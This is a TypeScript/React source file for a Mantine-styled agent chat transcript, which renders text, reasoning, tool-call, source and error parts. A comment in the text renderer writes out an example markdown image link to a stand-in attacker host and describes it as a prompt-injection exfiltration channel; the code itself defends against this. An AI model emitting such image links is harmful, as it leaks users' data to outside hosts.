/**
 * thread-message — Mantine-styled AgentPart renderers plus a role-labelled transcript renderer.
 *
 * `threadPartRenderers` overrides the headless `PartList` defaults from `../agent` with Mantine
 * chrome: markdown text, a dimmed collapsible for reasoning ("Thinking"), a rail-styled tool-call
 * block, a source Anchor, and a red error Alert. `ThreadTranscript` composes those renderers over
 * a thread's settled messages plus an optional live (in-flight) assistant turn.
 *
 * This module is Mantine-coupled by design — it lives in `agent-chat/`, the root surface where
 * Mantine is allowed (unlike the Mantine-free `agent/` headless layer it renders on top of).
 *
 * @example
 * import { ThreadTranscript } from 'basalt-ui'
 *
 * <ThreadTranscript
 *   messages={thread.messages}
 *   liveParts={liveParts}
 *   liveStatus={runStatus}
 * />
 */
import {
  Alert,
  Anchor,
  Box,
  Collapse,
  Group,
  Loader,
  Stack,
  Text,
  UnstyledButton,
} from '@mantine/core'
import { useDisclosure } from '@mantine/hooks'
import { Fragment, memo, useMemo } from 'react'
import type { JSX } from 'react'
import type {
  AgentPart,
  AgentPartRenderers,
  ChatMessage,
  ErrorPart,
  ForeignPart,
  PartRenderer,
  PartRenderers,
  ReasoningPart,
  SourcePart,
  StreamStatus,
  TextPart,
  ToolCallPart,
  TranscriptPart,
} from '../agent'
import { coalesceParts, narrowAgentPart, PartList } from '../agent'
import { Markdown } from '../content/markdown'
import { VX } from '../tokens'
import { ToolChip } from './tool-chip'

/** The mono, uppercase, letter-spaced micro-label idiom (docs/DESIGN-SPEC.md §3) — shared by the
 * transcript's role labels and the reasoning/tool-call headers below. */
const MICRO_LABEL_STYLE = {
  fontFamily: 'var(--basalt-font-mono)',
  fontSize: VX.text.micro,
  fontWeight: 500,
  letterSpacing: '0.06em',
  textTransform: 'uppercase',
  color: VX.faint,
} as const

// ── Per-type Mantine renderers ────────────────────────────────────────────────

function TextRenderer({
  part,
  settled,
}: {
  part: TextPart
  index: number
  settled: boolean
}): JSX.Element {
  // Markdown wraps its output in Prose (a div carrying chat-density typography). It must NOT be
  // wrapped in a Mantine `Text` (renders a `<p>`) — block elements inside a `<p>` are invalid
  // nesting that the browser auto-closes, scrambling spacing.
  //
  // TWO independent props, and conflating them is what broke this twice:
  //
  // `streaming={!settled}` is the RENDERING mode — NOT a hardcoded `streaming`. Hardcoding it kept
  // `Markdown` in block-split mode forever, and its tail block is unconditionally unsettled: a
  // FINISHED message ending in a ```mermaid fence rendered as a CodeBlock permanently, and the last
  // block of every finished message permanently hid its copy action.
  //
  // `contentTrust="untrusted"` is the SECURITY policy, and it is pinned unconditionally. Transcript
  // text is model-generated whether or not the run is still in flight, and images auto-fetch —
  // `![](https://attacker/?q=…)` is the classic prompt-injection exfiltration channel. Letting
  // `streaming` imply the policy meant every SETTLED (i.e. almost every) message silently regained
  // an open `https://` image allowlist the moment the run finished.
  return (
    <Markdown streaming={!settled} contentTrust="untrusted" density="chat">
      {part.text}
    </Markdown>
  )
}

// Tool-call/reasoning parts (docs/DESIGN-SPEC.md §5): a mono micro-label header with a faint left
// divider rail — quieter than the card idiom, since these are transcript asides, not surfaces.
const RAIL_STYLE = {
  borderLeft: `2px solid ${VX.divider}`,
  paddingLeft: 'var(--vx-space-agent-rail-inset-x)',
} as const

/** A dimmed, collapsed-by-default disclosure for reasoning/thinking fragments. */
function ReasoningRenderer({ part }: { part: ReasoningPart; index: number }): JSX.Element {
  const [open, { toggle }] = useDisclosure(false)
  return (
    <Box style={RAIL_STYLE}>
      <Stack gap={4}>
        <UnstyledButton onClick={toggle}>
          <Text style={MICRO_LABEL_STYLE}>{open ? 'Hide thinking' : 'Thinking'}</Text>
        </UnstyledButton>
        <Collapse expanded={open}>
          <Text size="xs" c="dimmed" style={{ whiteSpace: 'pre-wrap' }}>
            {part.text}
          </Text>
        </Collapse>
      </Stack>
    </Box>
  )
}

// Thin adapter: PartList's per-type renderer signature is `{ part, index, settled }`, ToolChip's is a
// richer `ToolChipProps` (defaultExpanded/onApprove/onDeny) that the built-in AgentPart union has
// no slot for — a 'tool' part reaching this path is always basalt's own six-variant union, never a
// consumer-registered one, so there is nowhere upstream to source approve/deny handlers from at
// this call site. A consumer that needs approve/deny wiring renders `ToolChip` directly instead of
// going through `PartList`/`threadPartRenderers`.
function ToolChipRenderer({ part }: { part: ToolCallPart; index: number }): JSX.Element {
  return <ToolChip part={part} />
}

function SourceRenderer({ part }: { part: SourcePart; index: number }): JSX.Element {
  return (
    <Anchor href={part.url} target="_blank" rel="noopener noreferrer" size="sm">
      {part.title ?? part.url}
    </Anchor>
  )
}

function ErrorRenderer({ part }: { part: ErrorPart; index: number }): JSX.Element {
  return (
    <Alert color="red" variant="light" radius="sm" p="xs">
      {part.message}
    </Alert>
  )
}

/**
 * Mantine overrides for `PartList`'s default headless renderers — the house style for rendering
 * an `AgentPart` inside a chat surface.
 *
 * @example
 * import { PartList } from 'basalt-ui/agent'
 * import { threadPartRenderers } from 'basalt-ui'
 * <PartList parts={parts} components={threadPartRenderers} />
 */
export const threadPartRenderers: Partial<AgentPartRenderers> = {
  text: TextRenderer,
  reasoning: ReasoningRenderer,
  tool: ToolChipRenderer,
  source: SourceRenderer,
  error: ErrorRenderer,
}

// ── UnknownPartChip — the dev-visible default fallback ────────────────────────

/** A visible marker for a part `ThreadTranscript` could not resolve — neither a registered
 * consumer renderer nor a built-in `AgentPart` variant claimed it. Dev-only by default (see
 * `DEFAULT_FALLBACK_RENDERER` below): a server emitting a new part type must not blank the
 * transcript, but it also shouldn't silently vanish while the app is being built against it. */
function UnknownPartChip({ part }: { part: ForeignPart }): JSX.Element {
  return (
    <Box style={RAIL_STYLE}>
      <Text style={MICRO_LABEL_STYLE}>{`Unknown part: ${part.type}`}</Text>
    </Box>
  )
}

/** Consulted only when `ThreadTranscript` gets no `fallbackRenderer` prop. `process.env.NODE_ENV`
 * (not `import.meta.env` — basalt-ui bans it) is read INSIDE the render so tests can flip it. */
const DEFAULT_FALLBACK_RENDERER: PartRenderer<ForeignPart> = ({ part }) =>
  process.env['NODE_ENV'] !== 'production' ? <UnknownPartChip part={part} /> : null

// ── Part resolution — the three-step order that is the whole design ───────────
//
// 1. `renderers[part.type]` — a registered consumer renderer, if present. Consumer wins, always.
// 2. `narrowAgentPart(part)` non-null — one of basalt's own six variants, routed to `PartList`'s
//    UNCHANGED, closed-union, exhaustive switch (`part-list.tsx:291-293`).
// 3. `fallbackRenderer` — anything left over. Never throws.
//
// `PartList` keeps its own `AgentPartRenderers` map and `assertNever` gate untouched — two
// registries, two jobs: `PartList` renders what basalt knows, exhaustively; `ThreadTranscript`
// renders what the app knows, openly. A `TPart` generic threaded through `AgentThread` →
// `ThreadsStore` → `useAgentThreadRuns` → every component would be the alternative, and it's the
// exact ripple `thread.ts:79-93` already cites as the reason `meta` stayed untyped.

type ResolvedSegment =
  | { readonly kind: 'agent'; readonly key: string; readonly parts: AgentPart[] }
  | {
      readonly kind: 'foreign'
      readonly key: string
      readonly part: ForeignPart
      readonly render: PartRenderer<ForeignPart>
    }

/**
 * Splits a message's parts into ordered, render-ready segments per the resolution order above.
 * Consecutive built-in-resolved parts are batched into one 'agent' segment — coalesced, then
 * handed to `PartList` as a unit — so the existing adjacent-merge behaviour (text+text, tool-by-id
 * regardless of adjacency) survives a foreign part interleaving the stream. A foreign-resolved
 * part always stands alone; there is nothing in the closed union for it to merge with.
 */
function resolveSegments(
  parts: readonly TranscriptPart[],
  renderers: PartRenderers,
  fallbackRenderer: PartRenderer<ForeignPart>,
): ResolvedSegment[] {
  const segments: ResolvedSegment[] = []
  let buffer: AgentPart[] = []

  const flushBuffer = (): void => {
    const first = buffer[0]
    if (first === undefined) return
    segments.push({ kind: 'agent', key: first.id, parts: coalesceParts(buffer) })
    buffer = []
  }

  for (const part of parts) {
    // `PartRenderers` resolves to `Record<string, PartRenderer<ForeignPart>>` in basalt-ui's own
    // (un-augmented) compilation — a plain runtime string-keyed lookup, `noUncheckedIndexedAccess`
    // giving the `| undefined` this relies on.
    const consumerRenderer = renderers[part.type]
    if (consumerRenderer !== undefined) {
      flushBuffer()
      // Not narrowed to ForeignPart by the `renderers[part.type]` lookup above — asserted, not
      // proven, by the registry contract (a registered key belongs to the consumer's foreign-part
      // union).
      segments.push({
        kind: 'foreign',
        key: part.id,
        part: part as ForeignPart,
        render: consumerRenderer,
      })
      continue
    }

    const agentPart = narrowAgentPart(part)
    if (agentPart !== null) {
      buffer.push(agentPart)
      continue
    }

    flushBuffer()
    segments.push({
      kind: 'foreign',
      key: part.id,
      part: part as ForeignPart,
      render: fallbackRenderer,
    })
  }

  flushBuffer()
  return segments
}

// ── MessageBlock (memoized) ────────────────────────────────────────────────────

const ROLE_LABEL: Record<ChatMessage['role'], string> = {
  user: 'You',
  assistant: 'Assistant',
}

// Terminal-state indicator (docs/AGENT-CHAT-SPEC.md §10) — `message.finish` is optional (absent on
// every user message and on pre-1.11 persisted assistant messages) and carries the distinction
// `ThreadStatus` deliberately does not: a stopped turn's thread status is `'done'`, same as a
// completed one. `'complete'` is the unremarkable case and has no entry here, so a lookup miss
// renders nothing — no badge on every ordinary message. Only 'stopped'/'error' earn a mark, in the
// same mono micro-label register as ROLE_LABEL, not a new decorative element.
const FINISH_INDICATOR: Partial<
  Record<
    NonNullable<ChatMessage['finish']>,
    { readonly label: string; readonly statusToken: string }
  >
> = {
  stopped: { label: 'Stopped', statusToken: VX.status.warn },
  error: { label: 'Error', statusToken: VX.status.bad },
}

type MessageBlockProps = {
  readonly message: ChatMessage<TranscriptPart>
  readonly streaming?: boolean
  readonly renderers: PartRenderers
  readonly fallbackRenderer: PartRenderer<ForeignPart>
}

/**
 * Render-execution counter for `MessageBlockImpl` — increments only when React actually calls the
 * function body (a `memo` bail-out never reaches it). NOT part of the public surface —
 * `agent-chat/index.ts` does not re-export it. The memoization test imports this module directly
 * (bypassing the barrel) to prove the memo boundary in a controlled render-count harness.
 */
export const messageBlockRenderCounter = { count: 0 }

function MessageBlockImpl({
  message,
  streaming = false,
  renderers,
  fallbackRenderer,
}: MessageBlockProps): JSX.Element {
  messageBlockRenderCounter.count += 1
  const settled = !streaming
  const segments = useMemo(
    () => resolveSegments(message.parts, renderers, fallbackRenderer),
    [message.parts, renderers, fallbackRenderer],
  )
  const finishIndicator =
    message.finish === undefined ? undefined : FINISH_INDICATOR[message.finish]

  // Assistant/user surfaces are differentiated by subtle vs panel tokens, radius 7
  // (VX.radiusCard, docs/DESIGN-SPEC.md §5) — the user's own turn sits a shade quieter than the reply.
  return (
    <Box
      style={{
        padding: 'var(--vx-space-agent-message-inset-y) var(--vx-space-agent-message-inset-x)',
        backgroundColor: message.role === 'user' ? VX.surface.subtle : VX.surface.panel,
        borderRadius: VX.radiusCard,
        boxShadow: VX.shadowCard,
      }}
    >
      <Stack gap={6}>
        <Group gap={6} align="center">
          <Text style={MICRO_LABEL_STYLE}>{ROLE_LABEL[message.role]}</Text>
          {streaming && <Loader size="xs" />}
          {finishIndicator !== undefined && (
            <Text style={{ ...MICRO_LABEL_STYLE, color: finishIndicator.statusToken }}>
              {finishIndicator.label}
            </Text>
          )}
        </Group>
        {segments.map((segment) =>
          segment.kind === 'agent' ? (
            <PartList
              key={segment.key}
              parts={segment.parts}
              components={threadPartRenderers}
              settled={settled}
            />
          ) : (
            <Fragment key={segment.key}>
              {segment.render({
                part: segment.part,
                messageId: message.id,
                partId: segment.part.id,
                settled,
                role: message.role,
              })}
            </Fragment>
          ),
        )}
      </Stack>
    </Box>
  )
}

/** Compares `message` BY REFERENCE plus the `streaming` flag — the props a per-token streaming
 * re-render must not force through every settled message's `MessageBlock`. `renderers`/
 * `fallbackRenderer` are included too: both are memoized once at the `ThreadTranscript` level (see
 * below), so in practice they're stable across renders, but a genuine change to either (a consumer
 * swapping its renderer map) must still invalidate the memo. */
function areMessageBlockPropsEqual(prev: MessageBlockProps, next: MessageBlockProps): boolean {
  return (
    prev.message === next.message &&
    prev.streaming === next.streaming &&
    prev.renderers === next.renderers &&
    prev.fallbackRenderer === next.fallbackRenderer
  )
}

const MessageBlock = memo(MessageBlockImpl, areMessageBlockPropsEqual)

// ── ThreadTranscript ──────────────────────────────────────────────────────────

const EMPTY_RENDERERS: PartRenderers = {}

type ThreadTranscriptBase = {
  /** Settled messages for the thread, oldest first. */
  readonly messages: readonly ChatMessage<TranscriptPart>[]
  /** The live (in-flight) assistant turn's parts, when a run is streaming for this thread. */
  readonly liveParts?: readonly TranscriptPart[]
  /** The live run's status — drives the in-progress indicator on the live block. */
  readonly liveStatus?: StreamStatus
  /** Consumer renderers keyed by part.type. Consulted BEFORE the built-in union. */
  readonly renderers?: PartRenderers
  /** Called for a part whose type is neither an AgentPart variant nor a registered key. Defaults
   * to a visible `UnknownPartChip` outside production, `null` in production — never throws. */
  readonly fallbackRenderer?: PartRenderer<ForeignPart>
}

export type ThreadTranscriptProps = ThreadTranscriptBase

/**
 * Renders a thread's settled messages, each role-labelled ("You" / "Assistant"). Each part
 * resolves in order: a registered `renderers[part.type]` first, then basalt's own `PartList` for
 * the built-in six, then `fallbackRenderer`. When `liveParts` is non-empty, an extra in-progress
 * assistant block is appended at the tail.
 *
 * @example
 * import { ThreadTranscript } from 'basalt-ui'
 * <ThreadTranscript messages={thread.messages} liveParts={liveParts} liveStatus={runStatus} />
 */
export function ThreadTranscript({
  messages,
  liveParts,
  liveStatus,
  renderers: renderersProp,
  fallbackRenderer = DEFAULT_FALLBACK_RENDERER,
}: ThreadTranscriptProps): JSX.Element {
  // Mirrors PartList's own `useMemo` (part-list.tsx:237-240) — avoids rebuilding the renderer
  // lookup on every streaming re-render.
  const renderers = useMemo(() => renderersProp ?? EMPTY_RENDERERS, [renderersProp])

  const liveMessage = useMemo<ChatMessage<TranscriptPart> | null>(() => {
    if (liveParts === undefined || liveParts.length === 0) return null
    return { id: '__live__', role: 'assistant', parts: liveParts as TranscriptPart[], createdAt: 0 }
  }, [liveParts])

  return (
    <Stack gap="sm">
      {messages.map((message) => (
        <MessageBlock
          key={message.id}
          message={message}
          renderers={renderers}
          fallbackRenderer={fallbackRenderer}
        />
      ))}
      {liveMessage !== null && (
        <div aria-live="polite" aria-atomic="false" aria-relevant="additions">
          <MessageBlock
            message={liveMessage}
            streaming={liveStatus === 'streaming'}
            renderers={renderers}
            fallbackRenderer={fallbackRenderer}
          />
        </div>
      )}
    </Stack>
  )
}
